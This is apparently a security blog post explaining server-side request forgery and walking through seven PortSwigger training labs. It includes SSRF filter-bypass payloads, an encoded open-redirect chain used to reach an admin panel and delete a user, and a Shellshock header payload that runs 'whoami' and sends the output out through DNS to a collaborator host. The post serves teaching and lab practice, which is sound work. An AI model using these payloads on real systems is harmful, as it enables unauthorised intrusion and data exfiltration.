---
title: "Server-Side-Request-Forgery"
date: 2026-10-26
draft: false
aliases:
  - /posts/ssrf/
description: "Theory, testing methodology, bypass techniques and PortSwigger SSRF lab write-ups."
tags:
  - SSRF
  - web
  - owasp
  - labs
categories:
  - methodology
---

## Description 

Server-Side Request Forgery (SSRF) is a vulnerability defined under [CWE-918](https://cwe.mitre.org/data/definitions/918.html). It occurs when an application fetches a remote resource using a user-supplied URL without sufficiently validating where that request is being sent. An attacker can trick the application into sending requests on their behalf. 

SSRF commonly exists in features that allow remote fetching of images, videos, documents, and other file imports through user-supplied input. Successful exploitation of SSRF may result in using the server as a proxy for external port scanning, denial of service, reading and accessing web server internal files, accessing the internal resources of the server that are not publicly accessible, as well as other internal services on the local network. 

## Impact

- **Internal reconnaissance** - Enumerate internal hosts, open ports and services from the server's perspective.
- **Access to internal resources** - Reach internal admin panels, APIs or services not exposed to the internet.
- **Sensitive data exposure** - Read internal files via `file://` or leak configuration depending on how the backend fetches the resource.
- **Cloud metadata abuse** - Query cloud instance metadata endpoints (e.g. `http://169.254.169.254/`) to obtain IAM keys/roles if present.
- **Blind SSRF** - Trigger out-of-band interactions (DNS/HTTP) which can be chained to further exploitation.
- **Lateral movement** - Interact with internal TCP services if other schemes like `gopher://` are allowed.

## Types of SSRF

| Type | Explanation |
| :-- | :-- |
| **In-Band SSRF** | The server's response to the forged request is returned to the attacker. |
| **Blind SSRF** | The response is not displayed. Detection is done via out-of-band (OOB) techniques such as Burp Collaborator or by timing differences. |
| **Semi-Blind SSRF** | The full response isn't shown, but indicators like status codes, error messages or response times can still leak information. |

## Where to Look

- **URL parameters** - `stockApi`, `url`, `path`, `dest`, `feed`, `callback`
- **Stock/check functionality** - "Check stock", price checkers or any feature that fetches data from a remote source
- **File imports** - Image/video/document import, thumbnail generation, PDF generation
- **Webhooks & analytics** - Features that fetch or log data from a user-supplied URL
- **HTTP headers** - `Referer`, `User-Agent` can be abused in blind SSRF scenarios
- **Redirect functionality** - Parameters like `path` that can be chained with SSRF via open redirects

## Common Protocols to Test

| Scheme | Notes |
| :-- | :-- |
| `http://`, `https://` | Most common. Test against internal IPs, hostnames and ports. |
| `file://` | Can lead to local file read in misconfigured URL fetchers. |
| `gopher://` | Can be used to interact with internal TCP services like Redis, Memcached in certain cases. |
| `dict://`, `ftp://`, `ldap://`, `sftp://` | Worth trying depending on the backend and allowed schemes. |

*Only test what is in scope.*

## Bypass Techniques

Based off [HackTricks](https://hacktricks.wiki/en/pentesting-web/ssrf-server-side-request-forgery/index.html) and [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery).

| Technique | Example | Notes |
| :-- | :-- | :-- |
| **Alternate localhost forms** | `127.0.0.1`, `localhost`, `127.1`, `0.0.0.0`, `[::1]` | Try different representations. |
| **IP obfuscation** | `2130706433` (Decimal), Octal, Hex | Some filters only match the string form of an IP. |
| **URL parsing abuse (@)** | `http://evil.com@127.0.0.1/admin` | Confuses naive parsers. The connection can go to the host after `@`. |
| **Fragments (#)** | `http://127.0.0.1/#expected.com` | `#` truncates what a regex/whitelist checks. |
| **Whitelist bypass** | `http://127.0.0.1%2523@stock.weliketoshop.net/` | Combine `@` and double-encoded `#` when the filter only decodes once. |
| **Double/Triple encoding** | `%23` -> `%2523` | Useful against filters that decode input before validation. |
| **Open redirect chaining** | SSRF -> trusted redirect to internal host | Very common when direct requests to internal IPs are blocked. |
| **Header abuse** | `Referer: http://127.0.0.1:8080/` | Used for blind SSRF in analytics/tracking features. |

## PortSwigger SSRF Labs 

### Lab 1 : Basic SSRF Against the local server 

**Goal :** Change the stock check url to access the admin interface at `https://localhost/admin`

**Analysis :** When we go to product -> `view details` -> and click the `check stock` function -> we can see `stock-Api = value ` which looks like the url value 

![SSRF_FOund](/images/SSRF/Lab1_SSRF_URL_Found.png)

**Exploitation :** 

We decode this back with `Ctrl+Shift+U` in BurpSuite. There are two parameters, `ProductID` & `StoreID`. We test that the `stock-API` parameter can accept `http://localhost`. 

![SSRF_F0und](/images/SSRF/Lab1_SSRF_localhost.png)

We can see it works. If we search for the admin panel `/admin` we can use that to access the admin panel as `http://localhost/admin`, delete the username as path `delete?username=carlos` and the lab is solved. 

![SSRF_F0und](/images/SSRF/Lab1_SSRF_Exploit.png)

### Lab 2 : Basic SSRF Against The another Backend System

**Goal :** Scan the internal `192.168.0.X` range for an admin interface at port 8080, then delete the username `carlos`

**Analysis :** When we go to product -> `view details` -> and click the `check stock` function we can see `stock-API = value ` which looks like the url value 

![SSRF_Found](/images/SSRF/Lab2_SSRF_IPFound.png)

**Exploitation :** 

We decode this back with `Ctrl+Shift+U` in BurpSuite. We will try to change the ip value of `http://192.168.0.X:8080` into `X = 1 , 2 , 3 , 4 ...etc` but this will take a long time so we will try with Intruder to scan all `255`. 

We found 404 on IP `40` and every other request returned 500.

![SSRF_Intruder](/images/SSRF/Lab2_Intruder_IP.png)

We try to access `/admin` at the end of that url and found we can access the admin page. 

![SSRF_carlosDelete](/images/SSRF/Lab2_carlosDelete.png)

Try to use that and delete the carlos user like Lab 1 and the lab is solved.

### Lab 3 : Blind SSRF with out-of-band detection

**Goal :** This site uses analytics software which fetches the URL specified in the Referer header when a product page is loaded. Use this to cause an HTTP request to the public Burp Collaborator server.

**Analysis :** We can see there is a Referer header when product pages are loaded. 

```http
GET /product?productId=3 HTTP/2
Host: 0ac500cf03016fbb8569130200bb0091.web-security-academy.net
Cookie: session=r2FXGpcgkc7QtehgpDgKWFttv0kDQx1a
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:153.0) Gecko/20100101 Firefox/153.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate, br
Referer: https://0ac500cf03016fbb8569130200bb0091.web-security-academy.net/
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
```

**Exploitation :** We will use `Burp => Collaborator => Copy to clipboard` which gives us something like `p8y54gj8qmp8lq3id8nq60bknbt2ht5i.oastify.com`. Inject the Burp Collaborator in the `Referer` header as `http://<collaborator-url>` and the lab is solved.

```http
GET /product?productId=3 HTTP/2
Host: 0ac500cf03016fbb8569130200bb0091.web-security-academy.net
Cookie: session=r2FXGpcgkc7QtehgpDgKWFttv0kDQx1a
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:153.0) Gecko/20100101 Firefox/153.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate, br
Referer: http://zknfgqvi2w1ix0fspiz0ianuzl5ct4ht.oastify.com
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
```

This vulnerability can even lead to RCE which we will see in later labs - Blind SSRF with Shellshock exploitation.

### Lab 4 : SSRF with blacklist-based input filter 

**Goal :** Change the stock check functionality to access the admin interface at `https://localhost/admin` and delete the `carlos` user

**Analysis :** When we go to product -> `view details` -> and click the `check stock` function we can see `stock-API = value` which looks like the url value, we try like Lab 1 but it is blocked with `"External Stocks Check are Block For Security Reasons"`.

**Exploitation :** So we will try with `127.0.0.1` instead of `localhost` and it still doesn't work, so we will try with `127.1` which is one of the bypass techniques and it shows the `/admin` panel. 

![SSRF_F0und](/images/SSRF/Lab4_SSRF_IPBypass.png)

*Note: There are a lot of ways to bypass this. For example, changing the IP address to its decimal version. Also the HackTricks Cheat Sheet is useful (https://hacktricks.wiki/en/pentesting-web/ssrf-server-side-request-forgery/url-format-bypass.html)*

When we try to access `/admin` it is blocked, so we try to URL-encode it with BurpSuite and hit send.

![SSRF_F0und](/images/SSRF/Lab4_SSRF_adminFail.png)

It is still denied, so we try to encode it again (double URL-encode) for all characters and it is still denied. So we just double-encode only the `a` character into `%25%36%31`.

![SSRF_F0und](/images/SSRF/Lab4_SSRF_AdminBypass.png)

We can see it works because the application uses regex to search for blacklisted strings and only URL-decodes once. 

We will try to delete the `carlos` user like previous labs.

![SSRF_F0und](/images/SSRF/Lab4_carlosDelete.png)

### Lab 5: SSRF with filter bypass via open redirection vulnerability

**Goal :** Change the stock check URL to access the admin interface at `http://192.168.0.12:8080/admin` and delete the user `carlos`.

**Analysis :** We can see the stock check functionality and also a "next product" functionality.

**Exploitation :** We send both to Repeater and `Ctrl+Shift+U` to decode the `stockApi` and can see it is not just a URL path value. 

![SSRF_openredirect1](/images/SSRF/Lab5_SSRF_openredirect1.png)

Next, we check the "next product" functionality and find `/product/nextProduct?currentProductId=1&path=/product?productId=2` where the `path` parameter can be manipulated.

![SSRF_openredirect2](/images/SSRF/Lab5_SSRF_openredirect2.png)

We can use this to redirect to `http://192.168.0.12:8080/admin`. We need to fully URL-encode it: 

`%2f%70%72%6f%64%75%63%74%2f%6e%65%78%74%50%72%6f%64%75%63%74%3f%63%75%72%72%65%6e%74%50%72%6f%64%75%63%74%49%64%3d%31%26%70%61%74%68%3d%68%74%74%70%3a%2f%2f%31%39%32%2e%31%36%38%2e%30%2e%31%32%3a%38%30%38%30%2f%61%64%6d%69%6e%2f%64%65%6c%65%74%65%3f%75%73%65%72%6e%61%6d%65%3d%63%61%72%6c%6f%73`

Pass this as the `stockApi` value and hit send. From there, we can access the delete path and delete `carlos`.

![SSRF_openredirect3](/images/SSRF/Lab5_SSRF_openredirect3.png)

### Lab 6: SSRF with whitelist-based input filter

**Goal :** Change the stock check URL to access the admin interface at `http://localhost/admin` and delete the user `carlos`. 

**Analysis :** We can see the stock check URL parameter `stockAPI=`. Trying `127.0.0.1` and `127.1` doesn't work, instead it shows `"External stock check host must be stock.weliketoshop.net"`. So the host must be `stock.weliketoshop.net` which is a subdomain of `weliketoshop.net`.

We need to trick the backend into routing the request to somewhere else by exploiting how the application parses URLs. 

We need to understand URL parsing - credentials are before `@`, host comes after, fragments after `#`. 

The whitelist filter looks for the string `stock.weliketoshop.net`. If we put it at the end, the filter might think it's safe. 

Testing `http://localhost#@stock.weliketoshop.net` gives `"External stock check host must be stock.weliketoshop.net"` because `#` truncates what it's checking. Removing `#` and keeping just `@` gives a 500 Internal Server Error, confirming our suspicion.

To bypass this, we URL-encode the `#` sign twice. This gives us `http://localhost%2523@stock.weliketoshop.net` where `localhost` is treated as the username/connection target and `stock.weliketoshop.net` is at the end for the whitelist check.

![SSRF_bypass](/images/SSRF/Lab7_SSRF1_Bypass.png)

*Note: For more details on URL parsing discrepancies, see [PayloadsAllTheThings - Bypass abusing URL parsing](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery#bypass-abusing-url-parsing-discrepancy)*

Now we can access the admin panel.

![SSRF_admin](/images/SSRF/Lab7_SSRF2.png)

We use `http://localhost%2523@stock.weliketoshop.net/admin/delete?username=carlos` and it works.

![SSRF_delete](/images/SSRF/Lab7_SSRF3.png)

### Lab 7 : Blind SSRF with Shellshock exploitation

**Goal :** Use this functionality to perform a blind SSRF attack against an internal server in the `192.168.0.X` range on port `8080`.

**Analysis :** This lab is the same as Lab 3 - we need to use Burp Collaborator to detect out-of-band requests.

**Exploitation :**

Like in the previous lab, we use Burp Collaborator. We can also use the extension `Collaborator Everywhere` which is really useful for finding out-of-band vulnerabilities. 

With `Collaborator Everywhere`, go to its extension settings and make sure to mark the Referer header if it's not default. Add the lab URL to scope under Target > Sitemap (right click and add to scope). Then browse/explore the lab.

![Collaborator_Everywhere_Settings](/images/SSRF/Lab8_CollaboratorEverywhere2.png)

The extension will inject payloads automatically and issues will pop up in the Sitemap tab.

![Collaborator_Everywhere](/images/SSRF/Lab8_CollaboratorEverywhere.png)

After finding that `User-Agent` and `Referer` are vulnerable to blind SSRF, we use a Shellshock payload (CVE-2014-6271). Classic payload structure: `() { :; }; <arbitrary_command>`

We put the following in the `User-Agent` header: 

```text
() { :; }; /bin/nslookup $(whoami).<your-collaborator-payload>.oastify.com
```

And in the `Referer` header we put the internal IP range: `Referer: http://192.168.0.X:8080`

```http
GET /product?productId=1 HTTP/2
Host: 0aff005803c048b8800e456e004700df.web-security-academy.net
Cookie: session=aVAWcekDUyDRA46WkKCRI1MDrXfutYkG
User-Agent: () { :; }; /bin/nslookup $(whoami).49boy2jnu0ln91reyyuwt5dej5pwdo1d.oastify.com
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate, br
Referer: http://192.168.0.X:8080
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
```

We don't know which `X` is vulnerable, so we send this request to Intruder (set payloads for numbers from 1 to 255) and attack.

![SSRF_Intruder](/images/SSRF/Lab8_SSRFIntruder.png)

After the attack finishes, click `Poll now` in Burp Collaborator.

![SSRF_Final](/images/SSRF/Lab8_SSRF_FInal.png)

We can see `peter.<randomString>` which is the username of the OS. Put that in Submit Solution and the lab is solved.

## References

- [PortSwigger - Server-side request forgery (SSRF)](https://portswigger.net/web-security/ssrf)
- [HackTricks - SSRF](https://hacktricks.wiki/en/pentesting-web/ssrf-server-side-request-forgery/index.html)
- [CWE-918 - Server-Side Request Forgery](https://cwe.mitre.org/data/definitions/918.html)
- [PayloadsAllTheThings - Server Side Request Forgery](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery)
- [Burp Suite Collaborator Documentation](https://portswigger.net/burp/documentation/collaborator)
